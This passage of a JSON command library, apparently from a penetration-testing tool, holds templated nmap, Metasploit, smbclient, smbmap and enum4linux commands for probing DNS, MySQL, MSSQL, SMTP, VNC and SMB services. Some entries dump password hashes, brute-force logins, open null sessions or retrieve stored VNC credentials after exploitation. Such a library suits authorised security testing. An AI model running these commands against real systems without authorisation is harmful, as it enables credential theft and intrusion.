"description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-sSU -p53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=<domain> <ip>", "tags": "[\"dns\", \"nmap\", \"53\"]", "more_info_url": null}, {"name": "dns metasploit enumeration", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use auxiliary/gather/enum_dns; set domain <domain>; set ns <dns_server>; exploit\"", "tags": "[\"dns\", \"msf\", \"53\"]", "more_info_url": null}, {"name": "dns sublist3r - subdomain enumeration", "description": "", "executable_type": "custom", "executable_path": "sublist3r", "arguments": "-d <domain> -v", "tags": "[\"dns\", \"sublist3r \", \"53\"]", "more_info_url": null}, {"name": "dns sublist3r - subdomain enumeration with bruteforce module enabled", "description": "", "executable_type": "custom", "executable_path": "sublist3r", "arguments": "-b -d <domain>", "tags": "[\"dns\", \"sublist3r \", \"53\"]", "more_info_url": null}, {"name": "connect", "description": "", "executable_type": "custom", "executable_path": "mysql", "arguments": "-u <user> -p<password> -h <hostname> <database>", "tags": "[\"mysql\", \"database\", \"db\", \"3306\"]", "more_info_url": null}, {"name": "Create database", "description": "", "executable_type": "custom", "executable_path": "mysql", "arguments": "-u <user> -p -e \"create database <database> character set UTF8mb4 collate utf8mb4_bin\"", "tags": "[\"mysql\", \"database\", \"db\", \"3306\"]", "more_info_url": null}, {"name": "Export database", "description": "", "executable_type": "custom", "executable_path": "mysqldump", "arguments": "-u <user> -p <database> > <path>", "tags": "[\"mysql\", \"database\", \"db\", \"3306\"]", "more_info_url": null}, {"name": "Import database", "description": "", "executable_type": "custom", "executable_path": "mysql", "arguments": "-u <user> -p <database> <path>", "tags": "[\"mysql\", \"database\", \"db\", \"3306\"]", "more_info_url": null}, {"name": "nmap - mysql enumeration", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <ip>", "tags": "[\"mysql\", \"database\", \"db\", \"3306\"]", "more_info_url": null}, {"name": "smtp nmap enumeration", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-p25 --script smtp-commands <ip>", "tags": "[\"smtp\", \"25\"]", "more_info_url": null}, {"name": "smtp nmap ntlm information disclosure", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-p25 --script smtp-ntlm-info <ip>", "tags": "[\"smtp\", \"25\"]", "more_info_url": null}, {"name": "nmap - smtp user enum", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "\u2013script smtp-enum-users.nse <ip>", "tags": "[\"smtp\", \"25\"]", "more_info_url": null}, {"name": "smtp user enum", "description": "", "executable_type": "custom", "executable_path": "smtp-user-enum", "arguments": "-M VRFY -U <userlist> -t <ip>", "tags": "[\"smtp\", \"25\"]", "more_info_url": null}, {"name": "msf - smtp user enum", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use auxiliary/scanner/smtp/smtp_enum; set RHOSTS <ip>; exploit\"", "tags": "[\"smtp\", \"25\"]", "more_info_url": null}, {"name": "nmap - telnet", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-n -sV -Pn --script \"*telnet* and safe\" -p 23 <ip>", "tags": "[\"telnet\", \"23\"]", "more_info_url": null}, {"name": "nmap - pop3 infos", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "--script \"pop3-capabilities or pop3-ntlm-info\" -sV -port <port> <ip>", "tags": "[\"pop\", \"pop3\", \"110\", \"995\"]", "more_info_url": null}, {"name": "mssql - connect", "description": "", "executable_type": "custom", "executable_path": "sqsh", "arguments": "-S <ip> -U <user>", "tags": "[\"mssql\", \"Microsoft SQL Server\", \"1433\"]", "more_info_url": null}, {"name": "mssql - enum", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "--script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <ip>", "tags": "[\"mssql\", \"Microsoft SQL Server\", \"1433\"]", "more_info_url": null}, {"name": "mssql - enum sql login", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use admin/mssql/mssql_enum_sql_logins; set RHOSTS <ip>; set USER_FILE <user_file>; set PASS_FILE <pass_file>; run\"", "tags": "[\"mssql\", \"Microsoft SQL Server\", \"1433\"]", "more_info_url": null}, {"name": "mssql - enum configuration setting (xp-cmdshell)", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use auxiliary/admin/mssql/mssql_enum; set RHOST <ip>; set password <password>; run\"", "tags": "[\"mssql\", \"Microsoft SQL Server\", \"1433\"]", "more_info_url": null}, {"name": "mssql link crawler", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use exploit/windows/mssql/mssql_linkcrawler\"", "tags": "[\"mssql\", \"Microsoft SQL Server\", \"1433\"]", "more_info_url": null}, {"name": "nbtscan - netbios scan", "description": "", "executable_type": "custom", "executable_path": "nbtscan", "arguments": "-r <ip_range>", "tags": "[\"netbios\", \"scan\", \"nbtscan\"]", "more_info_url": null}, {"name": "vnc - nmap enum", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <port> <ip>", "tags": "[\"vnc\", \"5800\", \"5801\", \"5900\", \"5901\"]", "more_info_url": null}, {"name": "vncviewer - connect to vnc no pass", "description": "", "executable_type": "custom", "executable_path": "vncviewer", "arguments": "<ip>::<port>", "tags": "[\"vnc\", \"5800\", \"5801\", \"5900\", \"5901\"]", "more_info_url": null}, {"name": "vncviewer - connect to vnc with password", "description": "", "executable_type": "custom", "executable_path": "vncviewer", "arguments": "-password <password.txt> <ip>::<port>", "tags": "[\"vnc\", \"5800\", \"5801\", \"5900\", \"5901\"]", "more_info_url": null}, {"name": "vnc msf test none auth", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS <ip>; set RPORT <port>; run\"", "tags": "[\"vnc\", \"5800\", \"5801\", \"5900\", \"5901\"]", "more_info_url": null}, {"name": "vnc - msf test login bf", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set RPORT <port>; set USERNAME <username>; run\"", "tags": "[\"vnc\", \"5800\", \"5801\", \"5900\", \"5901\"]", "more_info_url": null}, {"name": "vnc - msf test login bf (2)", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use auxiliary/scanner/vnc/vnc_login; set RHOSTS <ip>; set RPORT <port>; set USER_FILE <users_file>; set PASS_FILE <pass_file>; run\"", "tags": "[\"vnc\", \"5800\", \"5801\", \"5900\", \"5901\"]", "more_info_url": null}, {"name": "vnc - post exploit retrieve credentials", "description": "", "executable_type": "custom", "executable_path": "msfconsole", "arguments": "-x \"use post/windows/gather/credentials/vnc; set SESSION <session>; run\"", "tags": "[\"vnc\", \"5800\", \"5801\", \"5900\", \"5901\"]", "more_info_url": null}, {"name": "nbtscan - scan network looking for hosts", "description": "", "executable_type": "custom", "executable_path": "nbtscan", "arguments": "-r <ip_range>", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "smbclient with username and password", "description": "", "executable_type": "custom", "executable_path": "smbclient", "arguments": "\\\\\\\\<ip>\\\\<share> -U \"<user>%<password>\"", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "smbclient sessions without password", "description": "", "executable_type": "custom", "executable_path": "smbclient", "arguments": "\\\\\\\\<ip>\\\\<share> -U \"<user>%\"", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "smbclient null session", "description": "", "executable_type": "custom", "executable_path": "smbclient", "arguments": "\\\\\\\\<ip>\\\\<share> -U \"%\"", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "smb - find not signed  smb", "description": "", "executable_type": "custom", "executable_path": "nmap", "arguments": "-Pn -sS -T4 --open --script smb-security-mode -p445 <ip>", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "smb mount folder", "description": "", "executable_type": "custom", "executable_path": "mount", "arguments": "-t cifs //<ip>/C\\$ /tmp/mnttarget/ -o username=<user> -o domain=<domain>", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "smbmap", "description": "", "executable_type": "custom", "executable_path": "smbmap", "arguments": "-H <ip> -u \"<user>%<password>\"", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "smbmap - null access", "description": "", "executable_type": "custom", "executable_path": "smbmap", "arguments": "-u \"\" -p \"\" -P 445 -H <ip>", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "smbmap - guest access", "description": "", "executable_type": "custom", "executable_path": "smbmap", "arguments": "-u \"guest\" -p \"\" -P 445 -H <ip>", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "smbmap - list root of all shares", "description": "", "executable_type": "custom", "executable_path": "smbmap", "arguments": "-H <ip> -u <user> -p <password> -d <domain> -r", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "smbmap - recursively list dirs, and files", "description": "", "executable_type": "custom", "executable_path": "smbmap", "arguments": "-H <ip> -u <user> -p <password> -d <domain> -R <path> --depth 1", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "enum4linux - all except dictionary based share name listing (default)", "description": "", "executable_type": "custom", "executable_path": "enum4linux", "arguments": "-a <ip>", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "enum4linux - verbose", "description": "", "executable_type": "custom", "executable_path": "enum4linux", "arguments": "-v <ip>", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "enum4linux - null access", "description": "", "executable_type": "custom", "executable_path": "enum4linux", "arguments": "-u \"\" -p \"\" <ip>", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "enum4linux - guest access", "description": "", "executable_type": "custom", "executable_path": "enum4linux", "arguments": "-u \"guest\" -p \"\" <ip>", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "enum4linux - with authentication", "description": "", "executable_type": "custom", "executable_path": "enum4linux", "arguments": "-u <user> -p <password> <ip>", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}, {"name": "enum4linux - list Users", "description": "", "executable_type": "custom", "executable_path": "enum4linux", "arguments": "-U <ip> |grep 'users:'", "tags": "[\"smb\", \"samba\"]", "more_info_url": null}]}